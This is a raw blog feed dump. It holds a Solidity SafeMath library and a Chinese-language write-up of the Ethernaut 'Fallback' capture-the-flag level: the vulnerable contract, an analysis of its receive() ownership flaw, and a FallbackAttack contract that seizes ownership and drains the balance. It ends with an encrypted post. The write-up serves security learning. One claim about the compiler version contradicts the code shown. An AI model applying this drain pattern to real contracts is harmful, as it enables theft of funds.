class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        uint256 c = a + b;</span><br><span class="line">        require(c &gt;= a, &quot;SafeMath: addition overflow&quot;);</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        return sub(a, b, &quot;SafeMath: subtraction overflow&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b &lt;= a, errorMessage);</span><br><span class="line">        uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        if (a == 0) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 c = a * b;</span><br><span class="line">        require(c / a == b, &quot;SafeMath: multiplication overflow&quot;);</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        return div(a, b, &quot;SafeMath: division by zero&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b &gt; 0, errorMessage);</span><br><span class="line">        uint256 c = a / b;</span><br><span class="line">        //  assert(a == b * c + a % b); // There is no case in which this doesn&#x27;t hold</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        return mod(a, b, &quot;SafeMath: modulo by zero&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b != 0, errorMessage);</span><br><span class="line">        return a % b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://ethernaut.openzeppelin.com/level/0x0AA237C34532ED79676BCEa22111eA2D01c3d3e7">题目原地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.Fallback</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/01.Fallback/</url>
      
        <content type="html"><![CDATA[<h1 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>通关要求：获得这个合约的所有权(成为owner)，并且将这个合约的余额减少为0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">  //console是我自己加的，原题没有，只是为了方便调试，对题目没任何影响</span><br><span class="line"> console.log(&quot;(withdraw)msg.sender is:&quot;,msg.sender);</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先看编译器，使用的编译器版本是<code>&lt; 0.8.0</code>. 这意味着合约可能出现整数溢出漏洞。</p><p>然后重点的方法是<code>withdraw</code>，这个方法会将合约中的余额转到owner账户当中。但是这个方法有onlyOwner修饰，因此，我们需要将owner更改为我们的地址，才可以调用这个方法，从而达到通关目的。</p><p>如何将owner更改为我们的地址呢？有两个可能性：(1)contribute函数(2)receive函数</p><h3 id="contribute"><a href="#contribute" class="headerlink" title="contribute()"></a>contribute()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function contribute() public payable &#123;</span><br><span class="line">  require(msg.value &lt; 0.001 ether);</span><br><span class="line">  contributions[msg.sender] += msg.value;</span><br><span class="line">  if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法允许调用者发送一定的钱到合约，但是每次调用只可以发少于0.001ETH，这个钱会被存合约记录。当记录的钱数大于owner的时候，就会发生owner的转化。简单来说，合约的owner是在本合约中最有钱的人。</p><p>但是我们可以通过发送非常多钱从而成为owner吗？这是可以的，最初的owner拥有1000ETH，积累超过1000ETH就可以了。但是累计超过1000ETH，那至少调用1000001次contribute方法才行，我认为这个关卡的目的不是让我们通过这个方法来更改owner。那我们看看有没有其他方法。</p><h3 id="receive"><a href="#receive" class="headerlink" title="receive()"></a>receive()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们知道，当我们和一个合约交互，向合约发送以太币并且没传输数据data的时候，receive就会被调用。</p><p>我们分析知道，当满足：向合约发送的以太币大于0，并且调用者在合约中的记录钱数大于0，就可以发生owner的转化，思路清晰了。</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><ol><li>调用contribute方法，向合约发送1Wei</li><li>直接向合约transfer 1Wei</li><li>调用withdraw取钱</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">import &quot;hardhat/console.sol&quot;;//为了在控制台打印输出</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract FallbackAttack&#123;</span><br><span class="line">    address payable public _fallback;//用来存放题目的地址</span><br><span class="line"></span><br><span class="line">    constructor(address payable _address) payable public &#123;</span><br><span class="line">        _fallback = _address;//题目地址传入</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack1() public payable &#123;</span><br><span class="line">        //msg.value设置为10Wei</span><br><span class="line">        _fallback.call&#123;value: msg.value&#125;(abi.encodeWithSignature(&quot;contribute()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    function attack2() public payable &#123;</span><br><span class="line">        //msg.value设置为1Wei</span><br><span class="line">        _fallback.call&#123;value: 1&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack3() public payable &#123;</span><br><span class="line">    //打印调试</span><br><span class="line">    console.log(&quot;(attack4)msg.sender is:&quot;,msg.sender); </span><br><span class="line">    //提款</span><br><span class="line">        _fallback.call(abi.encodeWithSignature(&quot;withdraw()&quot;));          </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">    //一定要有receive或者回调函数！</span><br><span class="line">    //否则withdraw提款的时候无法成功！</span><br><span class="line">    //假如没这个函数，attack3虽然调用成功，但是却不会到账！</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>部署合约，将被攻击者Fallback作为参数输入FallbackAttack中，部署的时候给FallbackAttack 10Wei，因为发起攻击的时候需要一点钱</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221211172040057.png" alt="image-20221211172040057"></p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221211172146414.png" alt="image-20221211172146414"></p><p>attack1执行：调用contribute方法，向合约发送1Wei</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221211172245477.png" alt="image-20221211172245477"></p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221211172326321.png" alt="image-20221211172326321"></p><p>attack2执行：直接向合约transfer 1Wei</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221211172642376.png" alt="image-20221211172642376"></p><p>attack3执行：调用withdraw取钱</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221211172851753.png" alt="image-20221211172851753"></p><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取题目地址：<code>0x8341FA6Deb382b79b441deE6b920AC1470348A33</code></p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221221225711975.png" alt="image-20221221225711975"></p><p>部署：将题目地址放到At Address框中</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221221225752823.png" alt="image-20221221225752823"></p><p>设置msg.value=1Wei，调用contribute方法</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221221225850846.png" alt="image-20221221225850846"></p><p>设置msg.value=1, 调用Transact底层调用（目的是触发receive函数）</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221221230033879.png" alt="image-20221221230033879"></p><p>查看owner，已经成功被我们修改。然后调用withdraw函数取钱。</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221221230310212.png" alt="image-20221221230310212"></p><p>在靶场点击Submit instrance提交题目</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221221230332592.png" alt="image-20221221230332592"></p><p>成功！</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/01.Fallback/image-20221221230349143.png" alt="image-20221221230349143"></p><p><a href="https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F">原题目网站</a>与<a href="https://stermi.medium.com/ethernaut-challenge-1-solution-fallback-23ee62909b39">引用资料</a></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.references</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/00.%E5%8F%82%E8%80%83/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/00.%E5%8F%82%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>靶场：<a href="https://ethernaut.openzeppelin.com/">https://ethernaut.openzeppelin.com/</a></p><p>解题参考：</p><ul><li><a href="https://medium.com/@0xsage">https://medium.com/@0xsage</a></li><li><a href="https://stermi.medium.com/">https://stermi.medium.com/</a></li><li><a href="https://cyanwingsbird.blog/solidity/ethernaut/13-gatekeeper-one/">https://cyanwingsbird.blog/solidity/ethernaut/13-gatekeeper-one/</a></li><li><a href="https://cmichel.io/ethernaut-solutions/">https://cmichel.io/ethernaut-solutions/</a></li><li><a href="https://www.youtube.com/watch?v=AUQxXJiqLF4&amp;list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz&amp;index=14">https://www.youtube.com/watch?v=AUQxXJiqLF4&amp;list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz&amp;index=14</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.uniswap_v2_deploy</title>
      <link href="/2023/06/23/03.Uniswap/05.uniswap_v2_deploy/"/>
      <url>/2023/06/23/03.Uniswap/05.uniswap_v2_deploy/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bc030bba86dfc96573db416cf6337c461f70589c390ed687a3c575ce767dea3f">61aeca37f4136303695817d1fffb2bc8e2dad573e710378062e4eb54b8774639da633970b7b47795eb2c9662e954f1a7c19715472a05e2d5e70bf252e38e52c4e60ad5ce6b0498dd8052e06a79c911330c484e7fba14491840b8e3ebb51db5402a591e861555850b2550fe6f7844a77ba98921fee8da20a9145f028d25f8e3dc0eca621681f16132235d70c47fe1ef4b397dccbc2513662f6e53f33bed64985dfe27122d13876514d7f8fdb9e6f0358cc4f95ed78d6372dc477a1f6a61fe1554198bfa98a513b6a8949f68d90f185e6c5bee97f01185312cb4a4c95a5f88cbb0c1d59c5de57d47e32c220fba2bb3202ac638b3b7f47de59da4e8fecef2edcfd592d1520c1c4577a9a0750518904bc7b0670b20c447da28df95f44fe588ced1a93d582c316f2ad0939201b741a610c4f858d070cf790a276e2962681d75b1c80d251eab4416e7d04ceb4f2a74f9df03f989feccca5786d7c98d7669653b7b18c8d4bf4a3f3f2dfd98da439bb9559e037f9974c3896db984213ae44071046b71e9123e30ca57313790820609d393d07b5e8b263fb56ab08534aa74988c7e89dfa3b8967cf6b6e4c747e16cdc6ee6dfdd2716b9a76a365405a9b8c62043a404d213a3acb53fc7d611aaa42518d58052312a707d5c09438a95f74ae3b4796241c4710657d52d1af3547739b9e8fcc91f9d85b9fe2d0917326a4d15e1007ccef3030a162fb4fe05502f0da10c07f05426df848764305abf163b7126f35b4a131979945fc0ccaa3381a7918fbbe1e2f62296213ed4b4ec9204ec7257498dc1dc641f6053d08efb043e5a4f7455590bcbab4514fa2633a563ba390eaf683ab55d5965a80356230fc1fd2307ade2a55b4554c6a0f22f45e23db4d9a9cf52fc5d2b8c19a709ed86290858bc79fa2495d640c21ec8c8d71b662fc42832d1935feeac9ad01ff29b0d51355213fc5e368a6f31174d0b1bcc4374672bd061b448954ac09f4d82c3e3b53ef470b8cece461137704dddf50e527287345a324d4f33a59992f4dc96396b366942bb29201650482833d28fd8019108adad9636d955904aabccfec495e265c9cb36b343b8c65a0a3591abe45c171bb42076838ee2075e054d526e91d6518deb17565770d444424c08ba69913368991865834f17919cdb2328f30bad77780fde49853cd7b81f63cabc195b190dc044e93b650da06ef4f212b9a4f650668d6fdf30a0cb356f4dc6ef4b6505a580a963531922a1f424c80af64493a1584da004e60e655ef3b374435cd332d2c25120118c54e637cb4ed9df7c5cbe1ab5185f58e5781ac739f4bda7f6fe3c87f12a6f12360e9291311136ef4ffe7478879cd518f3354ab81582964695f45d7c00fb6adc2c709420aed891c7c763773ace19b2ed3684117032ff4b3f9e31b0489f95b9db04361ebb05f95c35d7ab2113a2ccd9feaf699d93d4324c1b982a42f85dac8f43bc9953487063886d31d5e5f6a1413190accf1a76ad3a94ee6d117ca6e505643e0f03e9514b46b70dd5736bcdcb6dfcc08ecba6e8582b9f339a9b3f5b8f2c281c48d5cc4d44e04a10d54984b22876c3d5c717dae006a7dede56f51c955c5111075cc20f0f50ce8b8c66270386c93b364470c92badf9848311c771821f452be5256bec9de505e32b50cb7d40da7f1865a3c369a3599d3be9b7ea6b3d2aa25b3e8c2e8ed9fcf2fbffd9ce0139c84d57735af8e6f45a1181c0b3c43d9355522f510541ad6e55013ed0cb616163366df7cfbc20a066175c90d5b9a7a87da613f86b2ced5f4e64e0d05d74a4252fc7bd531edce0f78d3f32bcacfe0dabbaef8507c891c774ee4e9261baa8bc9fe04e7c5bbb8ad73d5b808338ec2a32d534b3b0727f0f0ae4dba62ca142933d00f7d25e604bbb4e9804da29a1b1c990ef44a3dd97eea83277d0295b4d0ebf92a036168157481be27341a45a6ad6dbe50344617d00c4593ce0698a035f476ac319bab2e8704ea4b29d70008c5b7535f977fd6bf6ec242b597cf2343ae404e1d81d21c0bb17dfd8cfcbfbe544a4c2a25c03bb3809e15a6138886733f466d9a49cca619ff575ba3807aac8cd281cf5bb0f26abe81bce3c5234dc86a08923d05e3b15a0918989f9b29ce35420c53876ba640c4aac58a8db2ca8323fe3db6644ec12171cdba9f7c74d03be81f169b908c22bdffba70a3d521f052717361ab097570c8281904e3968f33da1b3e0aba39a5fd02765c8fa16cb166f396621b461d7bffb8c3916cc045cdec8c3aa41880a7feca29798ccde8a20979071bfc78a861b80add6362c918b02b102643a7791bb040fe060d83baae22d311a497682918c65738d93337f7fc8ac5b0bd658cd7356e73be11483a756dfa0b5108b897bc434fb9f0a9ad5b62476b30d10be61437c98bb890e35cfd1604ad747bddfd3356ab1ac333983cee2d864c01e2faecab95e9fbe9b54d450c7505b8af64ed05299aa68db1f7abf1188fbf477b3fdb37caae42556086ad08695912e06aead228f16f9206e6cabc849652b8c64ebbc8de72b3db360ede88d911bab378a54eaa083ec7112f942fbacd07f65747f60f97357b764319dff8241fcc0f2ed911fbf3b880a61aecd9751684c33726c657158e3c86acbd5913e46be799ddf9e3d2818afeb861f62065a8fd5272e940bf9b08b5b0fbe720a5976d8b793b680beeb016ba509aaf5f176885aedd2374a52fab180663ca11f7bea911ddac259756df0cfad0dd4024336c8ef0c47efa22d9dd2d0ac9820bde3c84fd1a1fb323b9c4634c74568208932ce06b250739eaf8f555cadb4a7f2b91ef44822042c20a97cc5273ebf72169b8ed0cd1ff8bed1382be2072c87df2cfdad052a26aefb3d89f0c5dafd9b4b64a141a54127bef5f24b4d6fca5ef0f729a018f016b7756ca82b03fc3172c969c51e1cab2d5f57b217086355aae919764f1698263f0e24fbdbb115cf7852c574c61b9f0e95a0795e04b78fdeec1df2f2e30716d0a068cc63b082d0ecf25983ce3f615867360e5d3a22f7f852c2c06953bcdf157ef5f75d0c8e95bee4f5c5dd158078fb150afd80470fd3a63feb14992fbdbf23167d3802b98e21ddecc8f03c38ecd2b64a93bc6db44f218a32e3a9f6085d547ac77bb1f319d4e90a4b7fa29058e14d4badfc1effac28c935d62ab32bf35181f87e122229d51afb81ab5d616ffae7c287ba6bb5b336878d2a1ad6787973c866e9a2160a57dad9b60f05b53b2ef47a3581dd1fa7170f80ada674b680ea5a6f00aaa136f96139832b029ac4f1740b7a6464963021ef3c6683e391106e87428b63450adbfb5ab55e4531507f6589db2f8cb2cf16733248d54124b3e096ea613c092a9c40a96c6902d9c933083bb5a25a9e57785521147fe7e835a28f10da195036dd7fd5303c283580f22844e51b385cfe46e09b847c96e24f7717522b565ed0182e00d405da9a27560d3152344fdc5db12f8a7c937529ad475a27c80e5e45dd0d3b63c869b56cf47553f662387c7ee6973ea26ae991f0a1e3059c793f16d52b0d2a0fb0fe4243f929b11fd0a189b3e562a6a25b3a96f3481d5767b179eebdc756485480bcfaaae0cc33e8ef9398f3105e720b5393ed23ae740d36a46f8fe1e3bf77b81dc7dfbbb8da4230c297a9500c1f3f6f8a03bbfcdff195880521311af95bc28ab429521cf1b84d76664efdc873b500a7f96954568df386d2f29157965e3c1719d9567cdf57a5af37af8dba0257a6dc2c84af3c0ed75e52e22364aeda2f3dd44418c4c23e774d9ada9763c27bd8da813edff359c5966308cfd5c6a572e6f0e063569460ae25232b4ff0e08ad824473bd6a58c7b495d0980a86331c6e0d9b3aef409931ac5480a9118127c0e7339ff92448fc49669f4d7d5500971c3a3a143d14b51c7a3d4abf680b510d659de194e800b59f861e3de371ab8600ea5b9cad844ae1b993517cdce3fa46decd76b9ce57e78394e8858ed925436e40ee0f0630cca9dfc75e229b45972c71d7587b1b4a1eb950a200d2b4f38749cf91c046fc85ff13765340d2b32775ebb259a92e7c8b13c806674ff2cdecbee8cc6d8562a42bb221d4e47e8ecb0acad2754cca673e6fc9affdef64989067dced39ad67f82b0ad4d21da1e20cc387fa02fea6fa3611a6307e80d6dffb0820eb43baeaa36991d8ea8a58c91202a549e4d6ddf71852d1be69a3d9a0733ed2fde08aaafae89b19f6d2354ab4f8b7169c91213dbe3808d919dc44dd24bed054ec1e2f21a8cb2da32755509b81c6526edbbfa8eb2b7fec667048cbb8c080732c8cf27e54e71fb9ba6667de3ea14c8eff2ba322ae4af3457b88215734637ea26b258f31c82adbfdb23f3d7caf1f603d02e9eb5936e5b337735d48a30c3fe215285ef540419368f1bb6ce994c093ef96566dcd4214d58b8c82dcc51a050811da5b2939099e48892776552eb35f9048f6b6649aac237eca8af7fa6ed827c5fb385621ee716922070438654b54da783d09bd2105e94fcf95e9b0464231eb502745d94e14495975be76f4d465befc0ff8b18bac17e55adc91830de297b3839eab9d0f5f57a5f799bb610df11195c0b1f4f4e0a476d6d42faeab72bf6ae21d8649867c94103bc8a99a0d716785d5cda7efe0b50d7463dbf8af87e3fc46d9a81031f06a08a3e56ae0ef32b532bfd75ff27f060e07f4eeb7caac8a4111876e0bdd3828d04b80efdad53d4a52d79c62ba437299d595cbfec8a9988fb358579e4e6dbac0be84ae46aebfc969e19ca7bddf1d9e437cd24903f5c865c747e3125ba39414f305eb122ff36478c869da667039ccbaf890b0ad37b753a94001ea268cef184a1c25226ba8fe6a35e4983f993f6bf32bcb55195e410dba0d336e0e635fca7832707c05e309ba1c21643961a24076fd6bb1d46a4d23690657c8cb5a50f0db0029b785403f12add451169669cc4b91d5b93e0098c16f00492f4c12c44ce2fe5e2a64522939e2b9e7451b81a6bfb5348197c3ae0e84b83ed78e4cb7176f4de022b965aa9b2c01108b0efb02f59a82e6125bc3d874a2ea741eb4ec073cfb08fb5be00e5b7abd1c6e192c519a6e9190c5034e4064dd80338124b495ee9099806cd6cf5a68bac6ad2e3e2cdb1ed8c867c76cc6e9a0bb7d6e1c31a5bfd0c0180e139bf444edd7fa6ee50a3d306c021e5319774875a4af50a2ae33ada9e2a46c24c8bc2578d694ce390a17247e6aa86aa1c85bc347f585487f27f83a1b5d6cf0b3e815c02959b23e8923494b0aba17e215e7fd0d1f96c88a77b61564de9c4c7b09e88cac076f9efdf34c491f45040711b9d1a976ca3c1a64022e2f1d85a7236e78dd1357d5217ad3d072aa2fb9b2a4fd922ca51a35c84215dc4bbb96c6d2ca529eab9b581434e324392031cc77e6b12c98a896ef573ec9e60917cfd71a132e21a182104335f7e21498bb4a86dec989a08cd8b65d26f130e9e26a4da5edc3131ad9478df1476e7414bff703a44678381d222b4dea0d2a483005a7dd5c8ae156bff4dde4c154e6c11308dcb471bbc64a63071aad168d3f4bd37ad089f04cf38664b9f45b89e980a14792a215f0fef06eeb53a68fbcc56dcfb6e1d6922c6c4ea550106a8aa425b84b9016c3a78a1f4adb02092d3caa7e230aac336277bd9f1c39e6d36ea3909117bee7ac2467e016d7b4d15e36be4f281109ce3672df792e4a7ac53d54e97abca523f12c28a36ecbcbbce0d817b382cd5ef129b2c24a47eada43b86fb6b0b8bf07c992f3bb4ada1f0273017b96035a090791cac5bec89dbd106e566cbf178847213445d80eff93f75fdbb193f0e89b2d8c901a44fbf0d9dc4616f0470d9900d3a8a4616818b0d7ea7f7a9108ba347e1cba0524ce3a868516ec1765290f84be5848cd7549a1ad769677e961f509bda71f528a21013f92dfd03436129f0eda1ef67020462788067abefd1bae524da9a837879c283dd58aee509cb97d760eef368cf1d2ae9be60c18481cf332e1ff34a69e0a3209df561ed3ed5e22720c076d86b6c160bbb8d595750796316829e2a97d46b5fd3b3aa8c7edd6737951646a34fa6719d5d0e209b2aa84ee16535c8d35bb3a017bab9b8af70f9daa3e400e1fbce3d828d6b15dc147fe1d252718752234f5c94abb7a383ab8973501c2c64f52ac29d3e0383df2c339a4d02de2de4c8024097e1937dd7ce59d0c512fa1da3ddfa3a0daff3489af41d2deba636bdd82ba0882a7c011dc8a337ffede7ee91efc20dbfa3670b170ad60597746cb583cc17b6e75ee0cbdb077783d4420ce1d020e2a5e3b131e8b0b260ffa3df1b30bb40add8b3dd8a2c94638b0ed5d4635fefd5bb90ba7157652a63d567a5a032ba00c2bb52804d9157a86b928d8215eeed557ca1b1b1b50596dfc9c304ca4ef502576e40d88cf7077fff095a7fbb4496f9e9601b8b2a2fb2dd7bc65dedc17a6d10b4d373212ac0380876c27b844630193e66eee6f5373975c7bb288a2f9498cff808045e51b032c45031937a71a8ffdd714f81cef3a2d9f38a4681c0776880310e34b1475f2674f6e8d5108252b260eb62630dc1866aaa6f424229ea7caaa9510e35cdd5e15d4739d69b0684258659eccee6e9fb2a9068b34eb4328570fd8716d57d823ac5214c6dc1ba73e5c844b2cca0e9a50b49d9248d6b293627d1993c4ba65654561b84e58e2b492eb53e4a64a260af2b5bc4c42848bfb8af80c3fa4b241d3587876502d47cdf153efbb5f0ea1f9c62bf3ec7468eaf9f54ee9759a2bc76081bcc1361906517d4f54a2b20470c6ea64fd3be497f4e0d0e95a647933fa0eb26e7cec6d1c51e4773510172f4738cfc51b1ccd375a1f982ef094f7621f50049dc09e3bce83c0cf766a0c564c1dcd8f21532b16296d8716410e75c933dd9af8de8279d443ca30c0cde39479e31ed058ba531b668942b16ad08610d0a63ba587b2fb321cf53a5d96a5e375f10a3e5e3e76dcd30efa56b84118b5bbbfd03bc943674b5d95696da28d0d7533bca15c384f94b12dc84ea897394348ac1b96ec540da104a9bc87c24e5ebaa8824ca10af782c514319e1151286d3daad4d9b0f83cb37a6b574aee706ef6f182e79bf74b0fe132d23050e78b267e91cf222de58fd41d3eab4b78272b93f7cd16dbe894f465dbf8dd3126ac805e111ac86db8c6721a299cc935f71e0c31a1a57368b31626991ce71adb80b115181a9dacadccc699b873bd9b27f10a8d92104992c5b111e5ba1db876a7fc355bba85a00bd077b66244bdf311d8aebed353ded769bc022babb4a9904e5494d08f7d2a4b6700f2e502ed35530b5c40dfbfc1